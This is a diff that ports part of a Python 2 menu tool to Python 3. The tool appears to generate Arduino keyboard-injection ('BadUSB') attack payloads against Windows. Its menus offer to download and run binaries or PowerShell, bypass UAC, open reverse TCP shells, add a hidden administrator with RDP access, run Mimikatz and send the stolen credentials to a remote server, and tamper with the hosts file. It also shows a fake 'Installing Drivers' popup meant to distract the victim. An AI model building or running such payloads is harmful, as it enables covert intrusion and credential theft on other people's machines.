@@ -12,14 +12,14 @@ import requests
 def WinBanner():
 
   coreUtils.clearScreen()
-  print "********************************************************************************************"
-  print "*                                                                                          *"
-  print "*                                                                                          *"
-  print "*                                     Windows Payloads                                     *"
-  print "*     These Payloads are made mostly for Windows 7, 8.1 and 10, as most use Powershell     *"
-  print "*                                                                                          *"
-  print "********************************************************************************************"
-  print "\n"
+  print("********************************************************************************************")
+  print("*                                                                                          *")
+  print("*                                                                                          *")
+  print("*                                     Windows Payloads                                     *")
+  print("*     These Payloads are made mostly for Windows 7, 8.1 and 10, as most use Powershell     *")
+  print("*                                                                                          *")
+  print("********************************************************************************************")
+  print("\n")
 
 def WinMenu():
 
@@ -43,11 +43,12 @@ def WinMenu():
   while True: 
     WinBanner()
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
 
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
     if selection =='1': 
       WinOption1() 
     elif selection == '2': 
@@ -78,7 +79,7 @@ def WinMenu():
     elif selection == '99':
       exit()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
 	  
 def notificationBubble():
 
@@ -86,22 +87,22 @@ def notificationBubble():
   message = "Please do not remove the device"
   while True:
 
-    answer = raw_input("Do you want to include a notifiction bubble as a distraction? Press Enter for default bubble settings, Yes to customize (Y/n/?):  ")
+    answer = input("Do you want to include a notifiction bubble as a distraction? Press Enter for default bubble settings, Yes to customize (Y/n/?):  ")
     
     if answer in ('Y','y','yes','Yes','YES'):
     
       while True:
-        print "\n"
-        print "Current notification bubble title is: " + title
-        print "Current notification bubble message is: " + message
+        print("\n")
+        print("Current notification bubble title is: " + title)
+        print("Current notification bubble message is: " + message)
         
-        print "\n"
-        customize = raw_input("Do you want to change the notification bubble text? (Y/n): ")
+        print("\n")
+        customize = input("Do you want to change the notification bubble text? (Y/n): ")
         
         if customize in ('Y','y','yes','Yes','YES',''):
-          print "\n"
-          title = raw_input("Please enter the Title of the notification bubble ->  ")
-          message = raw_input("Please enter the Message of the notification bubble ->  ")
+          print("\n")
+          title = input("Please enter the Title of the notification bubble ->  ")
+          message = input("Please enter the Message of the notification bubble ->  ")
         
         elif customize in ('N','n','no','No','NO',''):
       
@@ -128,7 +129,7 @@ def notificationBubble():
     elif answer == '?':
       nfoCore.bubbleInfo()
     else:
-      print "\nThat is not a valid option, enabling the default option Notification Bubble"
+      print("\nThat is not a valid option, enabling the default option Notification Bubble")
       buffer = "void bubblePopup(){\n"
       buffer += "  Keyboard.println(\"wlrmdr.exe -s 60000 -f 1 -t \\\"Installing Drivers\\\" -m \\\"Please do not remove the device\\\"\");\n"
       buffer += "  pressEnter();\n"
@@ -144,33 +145,33 @@ def checkUACBypass():
 
   while True:
 
-	  bypassUACoption = raw_input("Please select a bypass UAC method:\n 1.  No UAC Bypass\n 2.  https://goo.gl/fPl4tm for bypass(no UAC popup)\n 3.  run As (UAC popup visable)\n ?.  For more information\n Press Enter for default (None): ")
+    bypassUACoption = input("Please select a bypass UAC method:\n 1.  No UAC Bypass\n 2.  https://goo.gl/fPl4tm for bypass(no UAC popup)\n 3.  run As (UAC popup visable)\n ?.  For more information\n Press Enter for default (None): ")
 
-	  if bypassUACoption == "":
-		bypassUACoption = "1"
-		bypassUAC = noBypass()
-		bypassType = "None"
-		return bypassType,bypassUAC
-	  elif bypassUACoption == "1":
-		bypassUAC = noBypass()
-		bypassType = "None"
-		return bypassType,bypassUAC
-	  elif bypassUACoption == "2":
-		bypassUAC = BypassUACExploit()
-		bypassType = "https://goo.gl/fPl4tm (no visible popup)"
-		return bypassType,bypassUAC
-	  elif bypassUACoption == "3":
-		bypassUAC = BypassUACAdmin()
-		bypassType = "run As (visible popup)"
-		return bypassType,bypassUAC
-	  elif bypassUACoption == '?':
-		  nfoCore.UACBypassInfo()
-	  else:
-		print "That is not a valid option, giving you the default option of None"
-		bypassUAC = noBypass()
-		bypassType = "None"
-		raw_input("\nPress Enter to return to the previous Menu...")
-		return bypassType,bypassUAC
+    if bypassUACoption == "":
+      bypassUACoption = "1"
+      bypassUAC = noBypass()
+      bypassType = "None"
+      return bypassType,bypassUAC
+    elif bypassUACoption == "1":
+      bypassUAC = noBypass()
+      bypassType = "None"
+      return bypassType,bypassUAC
+    elif bypassUACoption == "2":
+      bypassUAC = BypassUACExploit()
+      bypassType = "https://goo.gl/fPl4tm (no visible popup)"
+      return bypassType,bypassUAC
+    elif bypassUACoption == "3":
+      bypassUAC = BypassUACAdmin()
+      bypassType = "run As (visible popup)"
+      return bypassType,bypassUAC
+    elif bypassUACoption == '?':
+      nfoCore.UACBypassInfo()
+    else:
+      print("That is not a valid option, giving you the default option of None")
+      bypassUAC = noBypass()
+      bypassType = "None"
+      input("\nPress Enter to return to the previous Menu...")
+      return bypassType,bypassUAC
 	
 def noUAVBypass():
 
@@ -314,8 +315,8 @@ def WinWriteFile(fileName,payloadFunc,bypassUAC,payload, bubble):
   file.write(buffer)
   file.close()
 
-  print "\n\noutput written to " + fileName
-  raw_input("\nPress Enter to continue and return to Main Menu...")
+  print("\n\noutput written to " + fileName)
+  input("\nPress Enter to continue and return to Main Menu...")
   coreUtils.clearScreen()
 
 
@@ -339,14 +340,14 @@ def WinOption1():
   while looper != True:
 
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                       Download and Execute Binary for Windows                            *"
-    print "*    This payload will download a binary and execute it, then close the powershell prompt  *"
-    print "*  Options are: 1. The URL 2. The binary name 3. How to bypass UAC 4. The output File name *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
-    print "\n"
+    print("********************************************************************************************")
+    print("*                                                                                          *")
+    print("*                       Download and Execute Binary for Windows                            *")
+    print("*    This payload will download a binary and execute it, then close the powershell prompt  *")
+    print("*  Options are: 1. The URL 2. The binary name 3. How to bypass UAC 4. The output File name *")
+    print("*                                                                                          *")
+    print("********************************************************************************************")
+    print("\n")
 
     menu = {}
     menu['0'] = "Info"
@@ -359,24 +360,25 @@ def WinOption1():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
 
-    print "\n\n"
+    print("\n\n")
     if URL != "":
-      print "URL of binary set to ->  " + URL
+      print("URL of binary set to ->  " + URL)
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
 
     if selection =='1': 
-      URL = raw_input("Please enter the full URL of the binary (please include \"http://\" or \"https://\"): ")
+      URL = input("Please enter the full URL of the binary (please include \"http://\" or \"https://\"): ")
       binary = coreUtils.getBinary(URL)
     elif selection == '2': 
       bypassUACoption,bypassUAC = checkUACBypass()
@@ -386,8 +388,8 @@ def WinOption1():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '5':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '42': 
@@ -398,7 +400,7 @@ def WinOption1():
     elif selection == '0':
       nfoCore.Win1info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
       
     if URL != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
@@ -450,14 +452,14 @@ def WinOption2():
   while looper != True:
   
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                      Download and Execute Powershell for Windows                         *"
-    print "*                This payload will download a powershell script then run it                *"
-    print "*  Options are: 1. The URL 2. The script name 3. How to bypass UAC 4. The output File name *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
-    print "\n"
+    print("********************************************************************************************")
+    print("*                                                                                          *")
+    print("*                      Download and Execute Powershell for Windows                         *")
+    print("*                This payload will download a powershell script then run it                *")
+    print("*  Options are: 1. The URL 2. The script name 3. How to bypass UAC 4. The output File name *")
+    print("*                                                                                          *")
+    print("********************************************************************************************")
+    print("\n")
   
     menu = {}
     menu['0'] = "Info"
@@ -470,24 +472,25 @@ def WinOption2():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
+    #options.sort(key=int)
+    #for entry in sorted(options):
     for entry in options: 
-      print entry, menu[entry]
+      print(entry, menu[entry])
 
-    print "\n\n"
+    print("\n\n")
     if URL != "":
-      print "URL of Powershell script set to ->  " + URL
+      print("URL of Powershell script set to ->  " + URL)
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
 
     if selection =='1': 
-      URL = raw_input("Please enter the full URL of the Powershell script (please include \"http://\" or \"https://\"): ")
+      URL = input("Please enter the full URL of the Powershell script (please include \"http://\" or \"https://\"): ")
       scriptName = coreUtils.getBinary(URL)
     elif selection == '2': 
       bypassUACoption,bypassUAC = checkUACBypass()
@@ -497,8 +500,8 @@ def WinOption2():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '5':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '42': 
@@ -509,7 +512,7 @@ def WinOption2():
     elif selection == '0':
       nfoCore.Win2info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
       
     if URL != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
@@ -548,14 +551,14 @@ def WinOption3():
   while looper != True:
 
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                     Execute Custom Powershell script for Windows                         *"
-    print "*                    This payload will run custom powershell script                        *"
-    print "*               Options are: 1. Powershell code 2. The output File name                    *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
-    print "\n"
+    print("********************************************************************************************")
+    print("*                                                                                          *")
+    print("*                     Execute Custom Powershell script for Windows                         *")
+    print("*                    This payload will run custom powershell script                        *")
+    print("*               Options are: 1. Powershell code 2. The output File name                    *")
+    print("*                                                                                          *")
+    print("********************************************************************************************")
+    print("\n")
   
     menu = {}
     menu['0'] = "Info"
@@ -569,24 +572,25 @@ def WinOption3():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
 
-    print "\n\n"
+    print("\n\n")
     if powershell != "":
-      print "powershell script is set"
+      print("powershell script is set")
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
 
     if selection =='1': 
-      powershell = raw_input("\"powershell -nop -w hidden\" will automatically be added to the payload\nPlease add \"-enc\" at the beginning if your script is fully encoded\nPlease input your powershell script: ")
+      powershell = input("\"powershell -nop -w hidden\" will automatically be added to the payload\nPlease add \"-enc\" at the beginning if your script is fully encoded\nPlease input your powershell script: ")
       powershell = coreUtils.checkQuotes(powershell)
     elif selection == '2': 
       bypassUACoption,bypassUAC = checkUACBypass()
@@ -596,18 +600,18 @@ def WinOption3():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '5':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '6':
       if powershell == "":
-        print "you have not entered a powershell script yet"
-        raw_input("Please press enter to continue")
+        print("you have not entered a powershell script yet")
+        input("Please press enter to continue")
         coreUtils.clearScreen()
       else:
-        print "Powershell script set as -> " +powershell
-        raw_input("Please press enter to continue")
+        print("Powershell script set as -> " +powershell)
+        input("Please press enter to continue")
     elif selection == '42': 
       coreUtils.clearScreen()	
       break
@@ -616,7 +620,7 @@ def WinOption3():
     elif selection == '0':
       nfoCore.Win3info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
       
     if powershell != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
@@ -649,14 +653,14 @@ def WinOption4():
   while looper != True:
 
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                      Reverse TCP CMD in Powershell for Windows                           *"
-    print "*          This payload will create a Reverse TCP CMD Prompt via Powershell                *"
-    print "*         Options are: 1. The IP 2. The listening port 3. The output File name             *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
-    print "\n"
+    print("********************************************************************************************")
+    print("*                                                                                          *")
+    print("*                      Reverse TCP CMD in Powershell for Windows                           *")
+    print("*          This payload will create a Reverse TCP CMD Prompt via Powershell                *")
+    print("*         Options are: 1. The IP 2. The listening port 3. The output File name             *")
+    print("*                                                                                          *")
+    print("********************************************************************************************")
+    print("\n")
   
     menu = {}
     menu['0'] = "Info"
@@ -670,28 +674,28 @@ def WinOption4():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
-
-    print "\n\n"
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
+    print("\n\n")
     if remoteIP != "":
-      print "IP of the remote server is set to ->  " + remoteIP
+      print("IP of the remote server is set to ->  " + remoteIP)
     if remotePort != "":
-      print "The listening port of the remote server is ->  " + remotePort
+      print("The listening port of the remote server is ->  " + remotePort)
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
 
     if selection =='1': 
-      remoteIP = raw_input("Please enter the IP of the remote server: ")
+      remoteIP = input("Please enter the IP of the remote server: ")
     elif selection == '2':
-      remotePort = raw_input("Please enter the listening port of the remote server: ")
+      remotePort = input("Please enter the listening port of the remote server: ")
     elif selection == '3': 
       bypassUACoption,bypassUAC = checkUACBypass()
     elif selection == '4':
@@ -700,8 +704,8 @@ def WinOption4():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '6':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '42': 
@@ -712,7 +716,7 @@ def WinOption4():
     elif selection == '0':
       nfoCore.Win4info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
       
     if remoteIP != "" and remotePort != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
@@ -761,14 +765,14 @@ def WinOption5():
   while looper != True:
   
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                     Add Administrator and Enable RDP for Windows                         *"
-    print "* This payload will add a user, then add the user to the Administrator Group and RDP Group *"
-    print "*     Options are: 1. UserName 2. Password 3. How to bypass UAC 4. The output File name    *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
-    print "\n"
+    print("********************************************************************************************")
+    print("*                                                                                          *")
+    print("*                     Add Administrator and Enable RDP for Windows                         *")
+    print("* This payload will add a user, then add the user to the Administrator Group and RDP Group *")
+    print("*     Options are: 1. UserName 2. Password 3. How to bypass UAC 4. The output File name    *")
+    print("*                                                                                          *")
+    print("********************************************************************************************")
+    print("\n")
   
     menu = {}
     menu['0'] = "Info"
@@ -782,28 +786,29 @@ def WinOption5():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
 
-    print "\n\n"
+    print("\n\n")
     if userName != "":
-      print "username set to ->  " + userName
+      print("username set to ->  " + userName)
     if userPass != "":
-      print "user password set to ->  " + userPass
+      print("user password set to ->  " + userPass)
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
 
     if selection =='1': 
-      userName = raw_input("Please enter the username to add to the admin group: ")
+      userName = input("Please enter the username to add to the admin group: ")
     elif selection == '2':
-      userPass = raw_input("Please enter the password for the new user: ")
+      userPass = input("Please enter the password for the new user: ")
     elif selection == '3': 
       bypassUACoption,bypassUAC = checkUACBypass()
     elif selection == '4':
@@ -812,8 +817,8 @@ def WinOption5():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '6':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '42': 
@@ -824,7 +829,7 @@ def WinOption5():
     elif selection == '0':
       nfoCore.Win5info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
       
     if userName != "" and userPass != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
@@ -869,15 +874,15 @@ def WinOption6():
   while looper != True:
   
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                         Download & Run Invoke-Mimikatz.ps1                               *"
-    print "*  This payload will download & run Invoke-Mimikatz.ps1 then send output to remote server  *"
-    print "*         Options are: 1. The mimikatz URL 2. remote IP 3. Listening Port                  *"
-    print "*                 4. How to bypass UAC 5. The output File name                             *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
-    print "\n"
+    print("********************************************************************************************")
+    print("*                                                                                          *")
+    print("*                         Download & Run Invoke-Mimikatz.ps1                               *")
+    print("*  This payload will download & run Invoke-Mimikatz.ps1 then send output to remote server  *")
+    print("*         Options are: 1. The mimikatz URL 2. remote IP 3. Listening Port                  *")
+    print("*                 4. How to bypass UAC 5. The output File name                             *")
+    print("*                                                                                          *")
+    print("********************************************************************************************")
+    print("\n")
 
     menu = {}
     menu['0'] = "Info"
@@ -892,34 +897,35 @@ def WinOption6():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
 
-    print "\n\n"
+    print("\n\n")
     if mimiURL != "":
-      print "URL of Invoke-Mimikatz.ps1 set to ->  " + mimiURL
+      print("URL of Invoke-Mimikatz.ps1 set to ->  " + mimiURL)
     if remoteIP != "":
-      print "The IP of the remote server is set to ->  " + remoteIP
+      print("The IP of the remote server is set to ->  " + remoteIP)
     if remotePort != "":
-      print "The listening port of the remote server is set to ->  " + remotePort
+      print("The listening port of the remote server is set to ->  " + remotePort)
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
 
     if selection =='1': 
-      mimiURL = raw_input("Please enter the full URL where Invoke-Mimikatz.ps1 is located (Please include \"http://\" or \"https://\")\nIf left blank, the default https://goo.gl/KBCGCr will be used: ")
+      mimiURL = input("Please enter the full URL where Invoke-Mimikatz.ps1 is located (Please include \"http://\" or \"https://\")\nIf left blank, the default https://goo.gl/KBCGCr will be used: ")
       if mimiURL == "":
         mimiURL = 'https://goo.gl/KBCGCr'
     elif selection == '2':
-      remoteIP = raw_input("Please enter the IP of the server to send the Mimikatz to: ")
+      remoteIP = input("Please enter the IP of the server to send the Mimikatz to: ")
     elif selection == '3':
-      remotePort = raw_input("Please enter the port the server will be listening on: ")
+      remotePort = input("Please enter the port the server will be listening on: ")
     elif selection == '4': 
       bypassUACoption,bypassUAC = checkUACBypass()
     elif selection == '5':
@@ -928,8 +934,8 @@ def WinOption6():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '7':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '42': 
@@ -940,7 +946,7 @@ def WinOption6():
     elif selection == '0':
       nfoCore.Win6info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
       
     if mimiURL != "" and remoteIP != "" and remotePort != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
@@ -987,14 +993,14 @@ def WinOption7():
   while looper != True:
   
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                            Change DNS Entry in Hostfile                                  *"
-    print "*       This payload will modify the hostfile to include specific Domain/IP entry          *"
-    print "*  Options are: 1. Domain Name 2. IP Address 3. How to bypass UAC 5. The output File name  *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
-    print "\n"
+    print("********************************************************************************************")
+    print("*                                                                                          *")
+    print("*                            Change DNS Entry in Hostfile                                  *")
+    print("*       This payload will modify the hostfile to include specific Domain/IP entry          *")
+    print("*  Options are: 1. Domain Name 2. IP Address 3. How to bypass UAC 5. The output File name  *")
+    print("*                                                                                          *")
+    print("********************************************************************************************")
+    print("\n")
   
     menu = {}
     menu['0'] = "Info"
@@ -1008,28 +1014,29 @@ def WinOption7():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
 
-    print "\n\n"
+    print("\n\n")
     if DNS != "":
-      print "The DNS entry is set to ->  " + DNS
+      print("The DNS entry is set to ->  " + DNS)
     if remoteIP != "":
-	  print "The IP of DNS entry is set to ->  " + remoteIP
+      print("The IP of DNS entry is set to ->  " + remoteIP)
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
 
     if selection =='1': 
-      DNS = raw_input("Please enter the DNS name of the entry you wish to add: ")
+      DNS = input("Please enter the DNS name of the entry you wish to add: ")
     elif selection == '2':
-	  remoteIP = raw_input("Please enter the IP address of the entry you wish to add:  ")
+	    remoteIP = input("Please enter the IP address of the entry you wish to add:  ")
     elif selection == '3': 
       bypassUACoption,bypassUAC = checkUACBypass()
     elif selection == '4':
@@ -1038,8 +1045,8 @@ def WinOption7():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '6':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '42': 
@@ -1050,7 +1057,7 @@ def WinOption7():
     elif selection == '0':
       nfoCore.Win7info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
       
     if DNS != "" and remoteIP != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
@@ -1090,14 +1097,14 @@ def WinOption8():
   while looper != True:
 
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                              Download File to Desktop                                    *"
-    print "*          This payload will download a file and copy it to the user's desktop             *"
-    print "*               Options are: 1. Full URL to file to download 2. File Name                  *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
-    print "\n"
+    print("********************************************************************************************")
+    print("*                                                                                          *")
+    print("*                              Download File to Desktop                                    *")
+    print("*          This payload will download a file and copy it to the user's desktop             *")
+    print("*               Options are: 1. Full URL to file to download 2. File Name                  *")
+    print("*                                                                                          *")
+    print("********************************************************************************************")
+    print("\n")
   
     menu = {}
     menu['0'] = "Info"
@@ -1110,26 +1117,27 @@ def WinOption8():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
 
-    print "\n\n"
+    print("\n\n")
     if URL != "":
-      print "Full URL to file set to ->  " + URL
+      print("Full URL to file set to ->  " + URL)
     if dropFile !="":
-	  print "Name of file being dropped onto Desktop ->  " + dropFile
+	    print("Name of file being dropped onto Desktop ->  " + dropFile)
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
 
     if selection =='1': 
-      URL = raw_input("Please enter the full URL of the file (please include \"http://\" or \"https://\"): ")
+      URL = input("Please enter the full URL of the file (please include \"http://\" or \"https://\"): ")
       dropFile = coreUtils.getBinary(URL)
     elif selection == '2': 
       bypassUACoption,bypassUAC = checkUACBypass()
@@ -1139,8 +1147,8 @@ def WinOption8():
       bubble, bubbleSetting = notificationBubble()
     elif selection == '5':
       if done == False:
-        print "\nYou have not set all the options"
-        raw_input("Press Enter to return to the menu and set all the options")
+        print("\nYou have not set all the options")
+        input("Press Enter to return to the menu and set all the options")
       else:
         looper = True
     elif selection == '42': 
@@ -1151,7 +1159,7 @@ def WinOption8():
     elif selection == '0':
       nfoCore.Win8info()
     else: 
-      print "\n\n***That is not a valid option!***\n\n" 
+      print("\n\n***That is not a valid option!***\n\n")
       
     if URL != "" and fileName != "" and bypassUACoption != "" and bubbleSetting != "":
       done = True
@@ -1190,14 +1198,14 @@ def WinOption9():
   while looper != True:
   
     coreUtils.clearScreen()
-    print "********************************************************************************************"
-    print "*                                                                                          *"
-    print "*                               Reverse TCP CMD Prompt                                     *"
-    print "*                 This payload will create a Reverse TCP CMD Prompt                        *"
-    print "*          Options are: 1. IP Address 2. Listening Port 3. The output File name            *"
-    print "*                                                                                          *"
-    print "********************************************************************************************"
-    print "\n"
+    print("********************************************************************************************")
+    print("*                                                                                          *")
+    print("*                               Reverse TCP CMD Prompt                                     *")
+    print("*                 This payload will create a Reverse TCP CMD Prompt                        *")
+    print("*          Options are: 1. IP Address 2. Listening Port 3. The output File name            *")
+    print("*                                                                                          *")
+    print("********************************************************************************************")
+    print("\n")
 
     menu = {}
     menu['0'] = "Info"
@@ -1211,28 +1219,29 @@ def WinOption9():
     menu['99']= "Exit"
 
     options=menu.keys()
-    options.sort(key=int)
-    for entry in options: 
-      print entry, menu[entry]
+    #options.sort(key=int)
+    #for entry in options: 
+    for entry in sorted(options):
+      print(entry, menu[entry])
 
-    print "\n\n"
+    print("\n\n")
     if remoteIP != "":
-      print "IP of the remote server set to ->  " + remoteIP
+      print("IP of the remote server set to ->  " + remoteIP)
     if remotePort != "":
-	    print "Listening port on the remote server set to ->  " + remotePort
+	    print("Listening port on the remote server set to ->  " + remotePort)
     if bypassUACoption != "":
-      print "bypassUAC technique set to ->  " + bypassUACoption
+      print("bypassUAC technique set to ->  " + bypassUACoption)
     if bubbleSetting != "":
-      print "Notification bubble set to -> " + bubbleSetting
+      print("Notification bubble set to -> " + bubbleSetting)
     if fileName != "":
-      print "Arduino filename set to ->  " + fileName
+      print("Arduino filename set to ->  " + fileName)
     
-    selection=raw_input("\nPlease Select: ") 
+    selection=input("\nPlease Select: ") 
 
     if selection =='1': 
